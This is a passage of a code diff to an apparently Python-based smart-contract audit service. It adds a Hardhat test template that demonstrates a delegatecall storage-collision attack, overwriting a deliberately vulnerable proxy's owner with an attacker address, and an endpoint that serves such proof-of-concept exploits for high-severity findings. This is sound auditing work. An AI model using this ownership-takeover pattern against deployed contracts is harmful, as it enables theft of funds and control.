+        "test": """const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("Delegatecall PoC", function () {
+  it("should overwrite owner storage slot", async function () {
+    const [owner, attacker] = await ethers.getSigners();
+    const Lib = await ethers.getContractFactory("Library");
+    const lib = await Lib.deploy();
+    await lib.waitForDeployment();
+
+    const Proxy = await ethers.getContractFactory("VulnerableProxy");
+    const proxy = await Proxy.deploy();
+    await proxy.waitForDeployment();
+    const proxyAddr = await proxy.getAddress();
+
+    // Delegatecall to Library.setOwner — overwrites proxy's storage slot 0
+    const data = lib.interface.encodeFunctionData("setOwner", [attacker.address]);
+    await proxy.delegate(await lib.getAddress(), data);
+
+    const newOwner = await proxy.owner();
+    expect(newOwner).to.equal(attacker.address);
+    console.log("Proxy owner overwritten via delegatecall: %%s", newOwner);
+  });
+});"""
+    },
+}
+
+
+def generate_poc_exploit(vuln: dict, target: str) -> dict:
+    t = vuln.get("type", "").lower()
+    for key, template in POC_TEMPLATES.items():
+        if key in t:
+            return {
+                "vulnerable_contract": template["contract"],
+                "hardhat_test": template["test"],
+                "extra_contracts": [template.get("extra_contract", "")] if template.get("extra_contract") else [],
+            }
+    return {
+        "vulnerable_contract": f"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Target {{ string public vulnType = \"{vuln.get('type', 'Unknown')}\"; }}",
+        "hardhat_test": f"""const {{ ethers }} = require("hardhat");
+const {{ expect }} = require("chai");
+describe("PoC: {vuln.get('type', 'Unknown')}", function () {{
+  it("should demonstrate the vulnerability", async function () {{
+    console.log("Manual proof-of-concept needed for: {vuln.get('type', 'Unknown')}");
+    console.log("Description: {vuln.get('description', '')}");
+  }});
+}});""",
+        "extra_contracts": [],
+    }
 
 
 @app.get("/api/export/markdown/{task_id}")
@@ -696,10 +978,17 @@ async def get_poc(task_id: str):
         return {"error": "Audit not completed"}
     result = task.get("result", {})
     target = task.get("input", "TargetContract")
-    pocs = [{"vulnerability": v.get("type"), "severity": v.get("severity"),
-              "exploit_code": generate_poc_exploit(v, target),
-              "test_case": f"// Foundry test for {v.get('type')}\n// pragma solidity ^0.8.0;\n// import 'forge-std/Test.sol';"}
-            for v in result.get("vulnerabilities", []) if v.get("severity") in ("CRITICAL", "HIGH")]
+    pocs = []
+    for v in result.get("vulnerabilities", []):
+        if v.get("severity") in ("CRITICAL", "HIGH"):
+            poc = generate_poc_exploit(v, target)
+            pocs.append({
+                "vulnerability": v.get("type"),
+                "severity": v.get("severity"),
+                "hardhat_test": poc["hardhat_test"],
+                "vulnerable_contract": poc["vulnerable_contract"],
+                "extra_contracts": poc["extra_contracts"],
+            })
     return {"pocs": pocs}
 
 
